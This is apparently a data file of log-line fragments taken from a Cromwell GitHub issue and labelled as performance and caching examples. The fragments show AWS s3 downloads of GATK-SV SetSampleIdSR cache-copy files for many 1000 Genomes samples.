s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Eviden",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:19080,cache,cacheCopy,19080,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-132/cacheCopy/SR00c.NA19449.txt.gz; 1608597255692,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-29/cacheCopy/SR00c.HG01396.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-29/cacheCopy/SR00c.HG01396.txt.gz; 1608597256940,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-114/cacheCopy/SR00c.NA18553.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-114/cacheCopy/SR00c.NA18553.txt.gz.tbi; 1608597259619,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-59/cacheCopy/SR00c.HG02374.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:86706,cache,cacheCopy,86706,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-133/cacheCopy/SR00c.NA19661.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-133/cacheCopy/SR00c.NA19661.txt.gz.tbi; 1608597487788,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-150/cacheCopy/SR00c.NA20802.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-150/cacheCopy/SR00c.NA20802.txt.gz.tbi; 1608597489587,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-55/cacheCopy/SR00c.HG02275.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-55/cacheCopy/SR00c.HG02275.txt.gz.tbi; 1608597491461,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:151851,cache,cacheCopy,151851,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-144/cacheCopy/SR00c.NA20346.txt.gz; 1608597247776,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-88/cacheCopy/SR00c.HG03694.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-88/cacheCopy/SR00c.HG03694.txt.gz; 1608597249388,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-141/cacheCopy/SR00c.NA20126.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-141/cacheCopy/SR00c.NA20126.txt.gz.tbi; 1608597252335,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-132/cacheCopy/SR00c.NA19449.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:84837,cache,cacheCopy,84837,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-145/cacheCopy/SR00c.NA20509.txt.gz; 1608597194778,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-55/cacheCopy/SR00c.HG02275.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-55/cacheCopy/SR00c.HG02275.txt.gz; 1608597196671,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-108/cacheCopy/SR00c.NA12872.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-108/cacheCopy/SR00c.NA12872.txt.gz.tbi; 1608597198607,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-83/cacheCopy/SR00c.HG03476.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:70494,cache,cacheCopy,70494,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-146/cacheCopy/SR00c.NA20510.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-146/cacheCopy/SR00c.NA20510.txt.gz.tbi; 1608597219467,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-124/cacheCopy/SR00c.NA19062.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-124/cacheCopy/SR00c.NA19062.txt.gz.tbi; 1608597222742,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-86/cacheCopy/SR00c.HG03649.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-86/cacheCopy/SR00c.HG03649.txt.gz; 1608597227140,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evidence",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:77670,cache,cacheCopy,77670,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-152/cacheCopy/SR00c.NA20869.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-152/cacheCopy/SR00c.NA20869.txt.gz.tbi; 1608597540849,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-121/cacheCopy/SR00c.NA18995.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-121/cacheCopy/SR00c.NA18995.txt.gz.tbi; 1608597542416,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-43/cacheCopy/SR00c.HG01958.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-43/cacheCopy/SR00c.HG01958.txt.gz.tbi; 1608597544559,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:167705,cache,cacheCopy,167705,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-39/cacheCopy/SR00c.HG01861.txt.gz; 1608597581880,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-138/cacheCopy/SR00c.NA19795.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-138/cacheCopy/SR00c.NA19795.txt.gz; 1608597584919,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-2/cacheCopy/SR00c.HG00129.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-2/cacheCopy/SR00c.HG00129.txt.gz; 1608597587281,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-97/cacheCopy/SR00c.HG03872.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a2",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:179241,cache,cacheCopy,179241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-51/cacheCopy/SR00c.HG02186.txt.gz.tbi; 1608597057531,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-5/cacheCopy/SR00c.HG00187.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-5/cacheCopy/SR00c.HG00187.txt.gz; 1608597060059,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-8/cacheCopy/SR00c.HG00288.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-8/cacheCopy/SR00c.HG00288.txt.gz.tbi; 1608597062290,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-99/cacheCopy/SR00c.HG04118.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:33120,cache,cacheCopy,33120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-54/cacheCopy/SR00c.HG02272.txt.gz.tbi; 1608597446991,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-4/cacheCopy/SR00c.HG00150.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-4/cacheCopy/SR00c.HG00150.txt.gz; 1608597448688,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-17/cacheCopy/SR00c.HG00701.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-17/cacheCopy/SR00c.HG00701.txt.gz.tbi; 1608597451192,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-96/cacheCopy/SR00c.HG03864.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4ea",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:139728,cache,cacheCopy,139728,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-56/cacheCopy/SR00c.HG02299.txt.gz; 1608597293653,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-149/cacheCopy/SR00c.NA20764.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-149/cacheCopy/SR00c.NA20764.txt.gz; 1608597295559,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-87/cacheCopy/SR00c.HG03684.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-87/cacheCopy/SR00c.HG03684.txt.gz.tbi; 1608597297393,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-99/cacheCopy/SR00c.HG04118.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:96675,cache,cacheCopy,96675,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-58/cacheCopy/SR00c.HG02367.txt.gz; 1608597650698,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-137/cacheCopy/SR00c.NA19746.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-137/cacheCopy/SR00c.NA19746.txt.gz; 1608597651470,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-96/cacheCopy/SR00c.HG03864.txt.gz.tbi to 